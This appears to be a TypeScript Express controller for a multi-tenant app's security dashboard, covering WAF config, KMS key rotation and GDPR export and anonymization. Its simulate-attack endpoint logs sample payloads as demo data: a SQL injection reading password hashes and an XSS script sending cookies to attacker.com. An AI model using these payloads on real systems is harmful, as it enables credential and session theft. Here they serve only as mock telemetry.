import { Response } from 'express';
import { PrismaClient } from '@prisma/client';
import { MultiTenantRequest } from '../middleware/tenant.middleware';
import { 
  securityLogs,
  securityTelemetry,
  ensureSecurityConfig,
  rotateKmsKey,
  anonymizeClient,
  exportClientData,
  createAuditLog,
  addSecurityLog
} from '../services/security.service';

const prisma = new PrismaClient();

// GET /api/security
export const getSecurityData = async (req: MultiTenantRequest, res: Response) => {
  try {
    const tenant = req.tenant;
    if (!tenant) {
      res.status(403).json({ error: 'Active organization context required' });
      return;
    }

    const organizationId = tenant.id;

    // Resolve active security config rules
    const config = await ensureSecurityConfig(organizationId);

    // Fetch flat list of Audit Logs
    const auditLogs = await prisma.auditLog.findMany({
      where: { organizationId },
      orderBy: { createdAt: 'desc' },
      take: 50
    });

    res.json({
      config,
      auditLogs,
      telemetry: securityTelemetry,
      logsStream: securityLogs
    });
  } catch (error) {
    console.error('Get security data error:', error);
    res.status(500).json({ error: 'Internal server error fetching security telemetry' });
  }
};

// POST /api/security/config
export const updateSecurityConfig = async (req: MultiTenantRequest, res: Response) => {
  try {
    const tenant = req.tenant;
    if (!tenant) {
      res.status(403).json({ error: 'Active organization context required' });
      return;
    }

    const organizationId = tenant.id;
    const { wafEnabled, rateLimitRpm, ipWhitelist } = req.body;

    if (rateLimitRpm === undefined || wafEnabled === undefined) {
      res.status(400).json({ error: 'Missing parameter wafEnabled or rateLimitRpm.' });
      return;
    }

    const updated = await prisma.securityConfig.update({
      where: { organizationId },
      data: {
        wafEnabled,
        rateLimitRpm: Number(rateLimitRpm),
        ipWhitelist: ipWhitelist || ''
      }
    });

    addSecurityLog(`[WAF/Limiter] Security settings updated. WAF: ${wafEnabled ? 'ON' : 'OFF'}, Limit: ${rateLimitRpm} RPM.`);

    await createAuditLog({
      organizationId,
      userId: req.user?.id,
      action: 'SECURITY_CONFIG_UPDATE',
      resource: 'Organization Security Settings',
      payload: { wafEnabled, rateLimitRpm, ipWhitelist }
    });

    res.json({
      message: 'Security configuration saved successfully.',
      config: updated
    });
  } catch (error) {
    console.error('Update security config error:', error);
    res.status(500).json({ error: 'Internal server error saving firewall configurations' });
  }
};

// POST /api/security/kms/rotate
export const rotateKmsKeys = async (req: MultiTenantRequest, res: Response) => {
  try {
    const tenant = req.tenant;
    if (!tenant) {
      res.status(403).json({ error: 'Active organization context required' });
      return;
    }

    const newKey = await rotateKmsKey(tenant.id, req.user?.id);

    res.json({
      message: 'KMS Master key rotated and database entries successfully re-keyed.',
      activeKmsKey: newKey
    });
  } catch (error) {
    console.error('Rotate KMS keys error:', error);
    res.status(500).json({ error: 'Internal server error executing key rotation' });
  }
};

// POST /api/security/gdpr/anonymize
export const anonymizeClientPII = async (req: MultiTenantRequest, res: Response) => {
  try {
    const tenant = req.tenant;
    if (!tenant) {
      res.status(403).json({ error: 'Active organization context required' });
      return;
    }

    const { clientId } = req.body;
    if (!clientId) {
      res.status(400).json({ error: 'Missing client identifier for anonymization.' });
      return;
    }

    await anonymizeClient(tenant.id, clientId, req.user?.id);

    res.json({
      message: 'GDPR client scrub completed. PII destroyed in database logs.'
    });
  } catch (error) {
    console.error('GDPR anonymize error:', error);
    res.status(500).json({ error: error instanceof Error ? error.message : 'Internal server error executing anonymization' });
  }
};

// POST /api/security/gdpr/export
export const exportClientPII = async (req: MultiTenantRequest, res: Response) => {
  try {
    const tenant = req.tenant;
    if (!tenant) {
      res.status(403).json({ error: 'Active organization context required' });
      return;
    }

    const { clientId } = req.body;
    if (!clientId) {
      res.status(400).json({ error: 'Missing client identifier for data portability export.' });
      return;
    }

    const exportData = await exportClientData(tenant.id, clientId, req.user?.id);

    res.json({
      message: 'GDPR data portability package compiled.',
      data: exportData
    });
  } catch (error) {
    console.error('GDPR export error:', error);
    res.status(500).json({ error: error instanceof Error ? error.message : 'Internal server error executing data portability export' });
  }
};

// POST /api/security/simulate-attack
export const simulateExploitAttack = async (req: MultiTenantRequest, res: Response) => {
  try {
    const tenant = req.tenant;
    if (!tenant) {
      res.status(403).json({ error: 'Active organization context required' });
      return;
    }

    const { type } = req.body;
    const ip = '185.220.101.42'; // mock Tor exit node IP

    if (type === 'SQL_INJECTION') {
      securityTelemetry.wafBlockedCount++;
      addSecurityLog(`[WAF Block] BLOCKED SQL Injection attempt from IP ${ip}. Raw: "UNION SELECT username, password_hash FROM users"`);
      
      await createAuditLog({
        organizationId: tenant.id,
        userId: req.user?.id,
        action: 'BLOCKED_ATTACK',
        resource: 'WAF Filter Intercept: SQL Injection',
        ipAddress: ip,
        userAgent: 'curl/7.68.0',
        payload: { rawExploit: 'UNION SELECT username, password_hash FROM users' }
      });
    } 
    else if (type === 'XSS') {
      securityTelemetry.wafBlockedCount++;
      addSecurityLog(`[WAF Block] BLOCKED Cross-Site Scripting (XSS) attempt from IP ${ip}. Raw: "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>"`);
      
      await createAuditLog({
        organizationId: tenant.id,
        userId: req.user?.id,
        action: 'BLOCKED_ATTACK',
        resource: 'WAF Filter Intercept: Cross-Site Scripting (XSS)',
        ipAddress: ip,
        userAgent: 'Mozilla/5.0 Exploiter-Bot/1.0',
        payload: { rawExploit: "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>" }
      });
    } 
    else if (type === 'RATE_LIMIT') {
      securityTelemetry.rateLimitThrottledCount++;
      addSecurityLog(`[Rate Limiter] Throttled client IP ${ip}. RPM threshold 120 exceeded.`);
    }

    res.json({
      message: `Exploit simulation event [${type}] completed.`
    });
  } catch (error) {
    console.error('Simulate attack error:', error);
    res.status(500).json({ error: 'Internal server error generating attack simulation' });
  }
};
